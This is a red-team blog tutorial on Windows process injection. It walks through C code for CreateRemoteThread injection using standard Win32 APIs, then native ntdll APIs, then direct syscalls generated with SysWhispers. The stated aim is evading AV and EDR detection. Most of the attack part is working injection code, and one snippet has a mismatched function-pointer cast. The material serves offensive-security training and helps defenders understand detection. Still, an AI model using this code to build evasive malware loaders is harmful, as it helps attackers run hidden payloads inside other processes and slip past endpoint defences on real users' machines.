---
layout: default
---

# Process Injection: Remote Thread Injection or CreateRemoteThread

In Every Red Team Operation, the goal of the Team is to Stay Stealthy and hide campaign operation from the blue team. From getting the initial access to hiding the C2 connections and exfiltrating data, they use various techniques and procedures to do that. The first step of every campaign is to get initial access. They use customized malware and payloads to circumvent and evade defending tools such as AVs and EDRs. 

[Process Injection](https://attack.mitre.org/techniques/T1055/) is one of the techniques that is used to evade the defense mechanism. Remote Thread Injection (aka CreateRemoteThread) is one of the simple and reliable sub technique. it works by injecting the shellcode (payload) into the context of another eligible process and creates a thread for that process to run the payload.

<!-- ![remote thread injection](/assets/images/remote-thread-injection.png "remote thread injection") -->
```
                                                                                                   
          +-------------------+                                          +-------------------+     
          |                   |                                          |                   |     
          |                   |                                          |                   |     
          |  Notepad Process  |                                          |  Malware Process  |     
          |                   |                                          |                   |     
          |                   |           1 allocating space             |                   |     
          |-------------------| <--------------------------------------  |                   |     
          |     shellcode     |                                          |                   |     
          |                   |           2 writing shellcode            |                   |     
          +-------------------+ <--------------------------------------  +-------------------+     
                 ^                                                         |                       
                 |                                                         |                       
                 |                                                         |                       
                 |                                                         |                       
                 v             3 creating a remote thread to run shellcode |                       
             +---------+                                                   |                       
             |         |  <------------------------------------------------+                       
             | thread  |                                                                           
             |         |                                                                           
             +---------+                                                                           
                                                                                                   
```
*figure 1*

We implement remote thread injection using standard Windows APIs, native APIs, and direct syscalls. each of these implementations has its own pros and cons. 
the following picture shows how standard windows APIs, Native APIs and direct syscalls work in windows architecture.

```
                                  +------------------------------+                                  
                                  |                              |                                  
                      +-----------|     Application Process      |----------------+                 
                      |           |                              |                |                 
                      |           +------------------------------+                |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |  Standard Windows API         |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           v                               |                 
                      |           +------------------------------+                |                 
                      |           |                              |                |                 
       Native API     |           |          kernel32.dll        |                |                 
                      |           |                              |                |                 
                      |           +------------------------------+                |  Direct Syscalls
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           v                               |                 
                      |           +------------------------------+                |                 
                      |           |                              |                |                 
                      +---------> |           Ntdll.dll          |                |                 
                                  |                              |                |                 
 User-Mode                        +------------------------------+                |                 
                                                  |                               |                 
                                                  |                               |                 
 -------------------------------------------------|-------------------------------|-----------------
                                                  |                               |                 
                                                  |                               |                 
 Kernel-Mode                                      |                               |                 
                                  +---------------v--------------+                |                 
                                  |                              |                |                 
                                  |         ntoskrnl.exe         | <--------------+                 
                                  |                              |                                  
                                  +------------------------------+                                  
```
*figure 2*

## Standard Windows APIs
### pros:
- easy to use

### cons:
- detectable by most AV/EDRs

we start by using standard Windows APIs as it is simpler than two other ways. First we need to find our target process ID. We create a function called ```find_process``` that gets a process name and it uses [CreateToolhelp32Snapshot](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) API to get the list of current processes and uses [Process32First](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first) and [Process32Next](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next) to go through them one by one and compare the name of the processes with our target process. **Process32First** and **Process32Next** APIs get a pointer to [PROCESSENTRY32](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32) struct that could hold information about processes like its name and id. If it succeeds to find the process it returns its process ID.
```c
DWORD find_process(char *process_name){

	PROCESSENTRY32 process_entry;
	process_entry.dwSize = sizeof(PROCESSENTRY32);

	//get the list of processes
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	//check processes to find TARGET_PROCESS_NAME
	if (Process32First(snapshot, &process_entry) == TRUE){
		
        	while (Process32Next(snapshot, &process_entry) == TRUE){
        		if (stricmp(process_entry.szExeFile, process_name) == 0){  
				    CloseHandle(snapshot);
				    return process_entry.th32ProcessID;
            	}
        	}
    	}

	CloseHandle(snapshot);
	return 0;
}
```
for the next step, we need to open our target process using the [OpenProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) function. We pass our parameters including the target process id that we get from the previous step and it returns a handle to that process.
```c
HANDLE target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_process_id);
```
 now we need to allocate space for our shellcode in the target process using the [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) function. we should allocate this space with **PAGE_EXECUTE_READWRITE** (Read, Write, Execute) permission. this function returns the base address of the allocated region. 
 ```c
 LPVOID remote_process_buffer = VirtualAllocEx(target_process_handle, NULL, sizeof(buf), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```
now we should write our shellcode into our allocated memory region using the [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) function. 
```c
WriteProcessMemory(target_process_handle, remote_process_buffer, buf, sizeof(buf), NULL);
```
after all, it's time to create a thread in the target process and run the shellcode that we previously wrote into a memory page. we use the [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) function. we should also pass 0 as the **dwCreationFlags** parameter to run the thread immediately after creation. 
```c
CreateRemoteThread(target_process_handle, NULL, 0,(LPTHREAD_START_ROUTINE) remote_process_buffer,NULL,0, NULL);
```
to compile the code in kali, we use **MinGW**.
```bash
x86_64-w64-mingw32-gcc main.c -o rti.exe
```
we send the output to our windows machine and run it. if we open **process hacker** and take a look at the **notepad.exe** process. in the memory section there is only one memory page with RWX permission which is suspicious. if we open it we can see our shellcode inside it. 

![processhacker notepad.exe](/assets/images/process-hacker-notepad.png "processhacker notepad.exe")
*image 1*

## Native API
### pros:
- bypass some of the AV/EDRs

### cons:
- hard to use
- still detectable by most AV/EDRs
- may not work on all windows versions

In order to interact with the operating system, programmers use Standard APIs (Win 32 APIs) that are recommended by Microsoft. Standard Windows APIs are a kind of wrapper for Native APIs. Native APIs or Undocumented APIs could be found in the ntdll.dll library. Microsoft doesn't recommend using these APIs. if you look at the second diagram you can see how these APIs are working. native APIs also interact with os kernel using syscalls. Microsoft uses this architecture because it can change the OS kernel without affecting the standard APIs. 

Native APIs are also called undocumented APIs because you can't usually find official documentats to use them. we can find a way of using them mostly by seeing other people's code, unofficial documents, or researching around them to see how they work. most of these APIs names start with Nt or Zw. 

In the previous section, we used standard APIs to do our job. here we go one layer deeper and use native APIs. we have a couple of more steps to use NTAPIS. for using Native APIs. first, we need to load the ntdll.dll into our malware process. then we should define function pointers with the exact same format as the original function that we want to use, and export the base address of these functions to initialize these pointers.

for loading ntdll.dll or any other dll dynamically into our running process, we use the [LoadLibraryW](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryw) function and it returns a handle to that library.

```c
HMODULE hNtdll = LoadLibraryW(L"ntdll");
```
then we define our function pointer type and get the base address of the function using the [GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress) function and assign it to the pointer. here is the example for [NtOpenProcess](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess).
```c
typedef NTSTATUS(NTAPI* pNtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
pNtOpenProcess NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
```
as you can see we defined our function type with the same parameters as the **NtOpenProcess** function. you should do this for all **NtWriteVirtualMemory**, **NtAllocateVirtualMemory**, **NtCreateThreadEx** functions. for finding the parameter and structure of an undocumented api you can use [http://undocumented.ntinternals.net/](http://undocumented.ntinternals.net/). but you may not find all the function definitions in it. you can search for it and see other people's codes or even looking inside the ntdll.dll library to see how it exactly works. 


### NtOpenProcess
like the previous section, we start by opening our target process but this time using [NtOpenProcess](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess). this function does not return a Handle to our target process but we need to pass a handle pointer as the first argument(pass by reference).
we should also pass a pointer to an [OBJECT_ATTRIBUTES](https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_object_attributes) structure and a pointer to **Client ID** struct so let's define them. we should also initialize **OBJECT_ATTRIBUTES** using [InitializeObjectAttributes](https://docs.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-initializeobjectattributes) macro and define **UNICODE_STRING** struct.
```c
#define InitializeObjectAttributes(p,n,a,r,s) { \
(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
(p)->RootDirectory = (r); \
(p)->Attributes = (a); \
(p)->ObjectName = (n); \
(p)->SecurityDescriptor = (s); \
(p)->SecurityQualityOfService = NULL; \
}

typedef struct _CLIENT_ID
{
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;


typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES ;


OBJECT_ATTRIBUTES oa;
InitializeObjectAttributes(&oa, NULL,0,NULL,NULL);
CLIENT_ID ci = { (HANDLE)procid, NULL };
```
now we can use **NtOpenProcess**
```c
NtOpenProcess(&target_process_handle,PROCESS_ALL_ACCESS, &oa, &ci);
```
### NtAllocateVirtualMemory
we allocate memory in target process using the [NtAllocateVirtualMemory](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory) function. we define the function prototype. 
```c
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
```
then we get the base address of the function.
```c
pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
```
and we call it
```c
NtAllocateVirtualMemory(target_process_handle, &remote_process_buffer, 0,&buf_len ,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```
we passed a void pointer named **remote_process_buffer** that will be the base address of the allocated space.

### NtWriteVirtualMemory
we define [NtWriteVirtualMemory](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtWriteVirtualMemory.html) function prototype like previous steps. we should pass our shellcode, the length of the shellcode, and the base address of the allocated space as arguments.  
```c
typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten OPTIONAL);
pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
NtWriteVirtualMemory(target_process_handle, remote_process_buffer, buf, buf_len, NULL);
```

### NtCreateThreadEx
now it's time to create a thread in our target process and run our shellcode. we use **NtCreateThreadEx** to create a remote thread in the target process and run our shellcode. we should pass 0 as the **CreateFlag** parameter to run the thread immediately after creation and 0x1FFFFF (PROCESS_ALL_ACCESS) as the **DesiredAccess** parameter. to see the function prototype, you can look [here](https://github.com/processhacker/processhacker/blob/753a395d55634f5e5483c517219414c2ecacfc23/phnt/include/ntpsapi.h#L1814).
```c
NtCreateThreadEx(&thread_handle, 0x1FFFFF, NULL, target_process_handle,(LPTHREAD_START_ROUTINE)remote_process_buffer,NULL, FALSE, NULL, NULL, NULL, NULL);
```

that's it for Native APIs. let's go one step deeper and use syscalls.

## Direct Syscalls
### pros:
- undetectable by all of the API monitoring tools that work on user-space

### cons:
- may not work on all windows versions
- hard to use

In the previous steps, any API monitoring application and EDRs could detect our API calls and ruin our operation. now if we use direct syscalls nothing in userland can detect our API calls. but as [sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) works as a driver in kernel space we can’t do anything about it. so, it is strongly recommended to use sysmon. 

One of the disadvantages of using syscalls is that their work is dependent on the version of OS and our code may not work on different windows versions. However, by using a great tool like [SysWhisper](https://github.com/jthuraisamy/SysWhispers) we can generate syscalls for different windows versions. you can run the following command to generate syscalls for our desired functions for windows 10.

```bash
syswhispers.py --function NtOpenProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscall --versions 10
```
this command generates two output files **syscall.asm** and **syscall.h** that we  add to our visual studio project. then we should enable [MASM](https://docs.microsoft.com/en-us/cpp/assembler/masm/masm-for-x64-ml64-exe?view=msvc-160) in the project and include the header file in our main code.

afterward using the functions is like Native APIs but here we don’t need to load ntdll.dll, get the base address of the functions, and defining function prototypes. I think SysWhisper has made it really easy to utilize syscalls.

You can find the codes for this post on my [Github](https://github.com/AlionGreen/remote-thread-injection).

## Credit:
thanks, [@0x00dtm](https://twitter.com/0x00dtm) for guiding me through Native APIs and Syscalls. it would be much harder without his help.

## References:
[https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)

[https://www.ired.team/offensive-security/code-injection-process-injection/process-injection/](https://www.ired.team/offensive-security/code-injection-process-injection/process-injection/)

[https://blog.dylan.codes/defending-your-malware/](https://blog.dylan.codes/defending-your-malware/)
